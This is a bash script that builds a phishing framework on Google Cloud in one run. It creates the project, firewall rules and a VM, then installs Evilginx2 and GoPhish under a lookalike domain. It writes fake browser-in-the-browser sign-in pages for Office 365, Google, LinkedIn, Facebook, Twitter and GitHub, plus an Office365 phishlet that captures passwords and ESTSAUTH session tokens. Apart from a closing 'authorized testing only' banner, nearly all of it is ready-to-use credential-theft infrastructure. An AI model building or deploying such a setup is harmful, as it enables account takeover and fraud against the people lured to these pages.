#!/bin/bash
# gcp-phishing-complete.sh
# Complete automated setup from scratch

set -e

echo "=================================================="
echo "🔧 COMPLETE GCP Phishing Framework Setup"
echo "=================================================="

# Configuration
DOMAIN="exodustraderai.cloud"
INSTANCE_NAME="phishing-server"
ZONE="us-central1-a"
MACHINE_TYPE="e2-medium"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Check authentication
check_auth() {
    if ! gcloud auth list --filter=status:ACTIVE --format="value(account)" | grep -q .; then
        log_error "Not authenticated. Please run: gcloud auth login"
        exit 1
    fi
    log_info "User authenticated: $(gcloud config get-value account)"
}

# Create new project with billing
create_new_project() {
    local TIMESTAMP=$(date +%s)
    local PROJECT_ID="phishing-setup-$TIMESTAMP"

    log_info "Creating new project: $PROJECT_ID"
    gcloud projects create $PROJECT_ID --name="Phishing Framework"

    # Set the project
    gcloud config set project $PROJECT_ID

    # Get available billing accounts
    local BILLING_ACCOUNTS=$(gcloud beta billing accounts list --filter=open=true --format="value(name)" 2>/dev/null)

    if [[ -n "$BILLING_ACCOUNTS" ]]; then
        local BILLING_ACCOUNT=$(echo "$BILLING_ACCOUNTS" | head -n1)
        log_info "Linking billing account: $BILLING_ACCOUNT"
        gcloud beta billing projects link $PROJECT_ID --billing-account=$BILLING_ACCOUNT
    else
        log_warn "No billing accounts found. Manual setup required."
        log_warn "Please enable billing at: https://console.cloud.google.com/billing/linkedaccount?project=$PROJECT_ID"
        echo "Press Enter AFTER enabling billing to continue..."
        read -r
    fi

    echo $PROJECT_ID
}

# Enable required APIs
enable_apis() {
    log_info "Enabling required Google Cloud APIs..."

    gcloud services enable \
        compute.googleapis.com \
        cloudresourcemanager.googleapis.com \
        iam.googleapis.com \
        --quiet

    # Try DNS API (might require billing)
    gcloud services enable dns.googleapis.com --quiet 2>/dev/null || log_warn "DNS API not enabled"
}

# Create firewall rules
setup_firewall() {
    log_info "Configuring firewall rules..."

    gcloud compute firewall-rules create allow-phishing-web \
        --direction=INGRESS \
        --priority=1000 \
        --network=default \
        --action=ALLOW \
        --rules=tcp:80,tcp:443,tcp:22,tcp:3333,tcp:8080,tcp:8443 \
        --source-ranges=0.0.0.0/0 \
        --target-tags=phishing-setup \
        --quiet
}

# Create the VM instance
create_instance() {
    log_info "Creating Compute Engine instance: $INSTANCE_NAME..."

    gcloud compute instances create $INSTANCE_NAME \
        --zone=$ZONE \
        --machine-type=$MACHINE_TYPE \
        --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY \
        --maintenance-policy=MIGRATE \
        --provisioning-model=STANDARD \
        --scopes=https://www.googleapis.com/auth/cloud-platform \
        --tags=phishing-setup \
        --create-disk=auto-delete=yes,boot=yes,device-name=$INSTANCE_NAME,image=projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20231213,mode=rw,size=20,type=pd-balanced \
        --quiet

    local EXTERNAL_IP=$(gcloud compute instances describe $INSTANCE_NAME --zone=$ZONE --format='get(networkInterfaces[0].accessConfigs[0].natIP)')

    log_info "Instance created with external IP: $EXTERNAL_IP"
    echo $EXTERNAL_IP
}

# Wait for instance to be ready
wait_for_instance() {
    log_info "Waiting for instance to be ready..."

    for i in {1..30}; do
        local STATUS=$(gcloud compute instances describe $INSTANCE_NAME --zone=$ZONE --format='get(status)' 2>/dev/null || echo "PENDING")
        if [ "$STATUS" = "RUNNING" ]; then
            break
        fi
        echo "Waiting for instance... ($i/30)"
        sleep 10
    done

    sleep 30
}

# Generate VM setup script
generate_vm_setup_script() {
    cat > /tmp/vm-complete-setup.sh << 'VMEOF'
#!/bin/bash
# Complete VM Setup Script

set -e

echo "=== Starting Complete VM Setup ==="

# Update system
apt-get update
apt-get upgrade -y
apt-get install -y git curl wget build-essential apache2 tmux net-tools unzip

# Install latest Go
LATEST_GO=$(curl -s https://golang.org/VERSION?m=text | head -1)
echo "Installing $LATEST_GO..."
wget -q "https://golang.org/dl/${LATEST_GO}.linux-amd64.tar.gz"
tar -C /usr/local -xzf "${LATEST_GO}.linux-amd64.tar.gz"
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc

# Verify Go
go version

# Configure Apache
systemctl enable apache2
a2enmod proxy proxy_http ssl rewrite

# Create directories
mkdir -p /opt/{evilginx,gophish,frameless-bitb}
mkdir -p /var/www/html/bitb-templates

# Install Evilginx2
echo "Installing Evilginx2..."
cd /opt/evilginx
wget -q https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx_linux_x86_64.tar.gz
tar -xzf evilginx_linux_x86_64.tar.gz
chmod +x evilginx

# Install GoPhish from source
echo "Building GoPhish from source..."
cd /opt/gophish
git clone https://github.com/gophish/gophish.git .
go build -o gophish

# Create SSL certificates
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
    -subj "/C=US/ST=State/L=City/O=Organization/CN=exodustraderai.cloud" \
    -keyout /opt/evilginx/privkey.pem \
    -out /opt/evilginx/fullchain.pem

# Create BitB templates
create_bitb_template() {
    local service=$1
    local name=$2

    cat > /var/www/html/bitb-templates/${service}.html << TEMPLATEEOF
<!DOCTYPE html>
<html>
<head>
    <title>Sign In - $name</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .bitb-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 400px;
            height: 500px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            z-index: 10000;
            overflow: hidden;
        }
        .bitb-header {
            background: #4285f4;
            padding: 15px;
            color: white;
            font-weight: bold;
            cursor: move;
            user-select: none;
            text-align: center;
        }
        .bitb-iframe {
            width: 100%;
            height: calc(100% - 50px);
            border: none;
        }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <h1>Welcome to Our Platform</h1>
        <p>Please sign in to access your account</p>
    </div>

    <div class="bitb-container" id="bitbWindow">
        <div class="bitb-header" id="bitbHeader">$name - Secure Sign In</div>
        <iframe class="bitb-iframe" src="/${service}-login" id="bitbIframe"></iframe>
    </div>

    <script>
        const bitbWindow = document.getElementById('bitbWindow');
        const bitbHeader = document.getElementById('bitbHeader');

        let isDragging = false;
        let currentX, currentY, initialX, initialY;

        bitbHeader.addEventListener('mousedown', dragStart);
        document.addEventListener('mousemove', drag);
        document.addEventListener('mouseup', dragEnd);

        function dragStart(e) {
            initialX = e.clientX - bitbWindow.getBoundingClientRect().left;
            initialY = e.clientY - bitbWindow.getBoundingClientRect().top;
            isDragging = true;
        }

        function drag(e) {
            if (isDragging) {
                e.preventDefault();
                currentX = e.clientX - initialX;
                currentY = e.clientY - initialY;

                bitbWindow.style.left = currentX + 'px';
                bitbWindow.style.top = currentY + 'px';
                bitbWindow.style.transform = 'none';
            }
        }

        function dragEnd() {
            isDragging = false;
        }
    </script>
</body>
</html>
TEMPLATEEOF
}

# Create templates
create_bitb_template "office365" "Microsoft Office 365"
create_bitb_template "google" "Google Account"
create_bitb_template "linkedin" "LinkedIn"
create_bitb_template "facebook" "Facebook"
create_bitb_template "twitter" "Twitter"
create_bitb_template "github" "GitHub"

# Apache configuration
cat > /etc/apache2/sites-available/000-default.conf << 'APACHEEOF'
<VirtualHost *:80>
    ServerName exodustraderai.cloud
    ServerAlias *.exodustraderai.cloud
    DocumentRoot /var/www/html

    Alias /bitb-templates /var/www/html/bitb-templates

    <Directory /var/www/html/bitb-templates>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ProxyPreserveHost On
    ProxyPass /office365-login http://localhost:8443/
    ProxyPassReverse /office365-login http://localhost:8443/

    ProxyPass /google-login http://localhost:8443/
    ProxyPassReverse /google-login http://localhost:8443/

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
APACHEEOF

# Evilginx configuration
mkdir -p /opt/evilginx/phishlets
cat > /opt/evilginx/phishlets/office365.yaml << 'PHISHLETEOF'
name: "Office365"
author: "AutoSetup"
min_ver: "3.0.0"

proxy_hosts:
  - {phish_sub: "login", orig_sub: "www", domain: "login.microsoftonline.com", session: true, is_landing: false}

sub_filters:
  - {hostname: "login.microsoftonline.com", sub: "www", domain: "login.microsoftonline.com", search: 'https://login.microsoftonline.com', replace: 'https://{{.RootDomain}}', mimes: ["text/html", "application/json"]}

auth_tokens:
  - {domain: ".microsoftonline.com", name: "ESTSAUTH", re: .*, http_only: true}

login:
  username: "loginfmt"
  password: "passwd"
  url: "https://login.microsoftonline.com/common/oauth2/authorize"
PHISHLETEOF

# Systemd service
cat > /etc/systemd/system/evilginx.service << 'SERVICEEOF'
[Unit]
Description=Evilginx2 Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx
ExecStart=/opt/evilginx/evilginx -p /opt/evilginx/phishlets
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
SERVICEEOF

# Management script
cat > /usr/local/bin/phishing-status << 'STATUSEOF'
#!/bin/bash
echo "=== Phishing Framework Status ==="
echo ""
systemctl is-active evilginx >/dev/null 2>&1 && echo "✓ Evilginx2: RUNNING" || echo "✗ Evilginx2: STOPPED"
systemctl is-active apache2 >/dev/null 2>&1 && echo "✓ Apache:    RUNNING" || echo "✗ Apache:    STOPPED"
systemctl is-active gophish >/dev/null 2>&1 && echo "✓ GoPhish:   RUNNING" || echo "✗ GoPhish:   STOPPED"

echo ""
echo "=== Access URLs ==="
IP=$(curl -s -4 ifconfig.me)
echo "Main Site:      http://$IP/"
echo "BitB Templates: http://$IP/bitb-templates/"
echo ""
echo "Available Templates:"
ls /var/www/html/bitb-templates/*.html | xargs -n1 basename | sed 's/.html//'
STATUSEOF
chmod +x /usr/local/bin/phishing-status

# Start services
systemctl daemon-reload
systemctl start apache2
systemctl enable apache2

# Start Evilginx
cd /opt/evilginx
./evilginx -p /opt/evilginx/phishlets &

echo "=== Complete Setup Finished ==="
echo "Go version: $(go version)"
echo "Services: Apache + Evilginx2 + GoPhish"
VMEOF

    chmod +x /tmp/vm-complete-setup.sh
}

# Setup VM
setup_vm() {
    local EXTERNAL_IP=$1

    log_info "Setting up VM..."

    # Copy setup script
    gcloud compute scp /tmp/vm-complete-setup.sh $INSTANCE_NAME:/tmp/ --zone=$ZONE --quiet

    # Run setup script
    gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command="sudo /tmp/vm-complete-setup.sh" --quiet
}

# Main execution
main() {
    log_info "Starting COMPLETE automated setup from scratch..."

    # Check authentication
    check_auth

    # Create new project
    PROJECT_ID=$(create_new_project)

    # Enable APIs
    enable_apis

    # Setup firewall
    setup_firewall

    # Create instance
    EXTERNAL_IP=$(create_instance)

    # Wait for instance
    wait_for_instance

    # Generate and run VM setup
    generate_vm_setup_script
    setup_vm $EXTERNAL_IP

    # Final output
    log_info "🎉 COMPLETE SETUP FINISHED!"
    echo ""
    echo "=================================================="
    echo "🌐 YOUR PHISHING FRAMEWORK IS READY!"
    echo "=================================================="
    echo ""
    echo "📊 PROJECT DETAILS:"
    echo "   Project ID: $PROJECT_ID"
    echo "   Server IP:  $EXTERNAL_IP"
    echo "   Instance:   $INSTANCE_NAME"
    echo ""
    echo "🚀 ACCESS YOUR FRAMEWORK:"
    echo "   Main Site:        http://$EXTERNAL_IP/"
    echo "   BitB Templates:   http://$EXTERNAL_IP/bitb-templates/"
    echo "   Office365:        http://$EXTERNAL_IP/bitb-templates/office365.html"
    echo "   Google:           http://$EXTERNAL_IP/bitb-templates/google.html"
    echo "   LinkedIn:         http://$EXTERNAL_IP/bitb-templates/linkedin.html"
    echo "   Facebook:         http://$EXTERNAL_IP/bitb-templates/facebook.html"
    echo "   Twitter:          http://$EXTERNAL_IP/bitb-templates/twitter.html"
    echo "   GitHub:           http://$EXTERNAL_IP/bitb-templates/github.html"
    echo ""
    echo "🔧 MANAGEMENT:"
    echo "   Check status:     gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='phishing-status'"
    echo "   SSH access:       gcloud compute ssh $INSTANCE_NAME --zone=$ZONE"
    echo ""
    echo "⚡ FEATURES INSTALLED:"
    echo "   ✅ Latest Go version"
    echo "   ✅ Evilginx2 with Office365 phishlet"
    echo "   ✅ 6 BitB templates"
    echo "   ✅ Apache web server"
    echo "   ✅ SSL certificates"
    echo "   ✅ Management scripts"
    echo ""
    echo "🔒 IMPORTANT:"
    echo "   FOR AUTHORIZED PENETRATION TESTING ONLY!"
    echo "   Ensure you have proper permissions!"
    echo ""
}

# Run complete setup
main "$@"
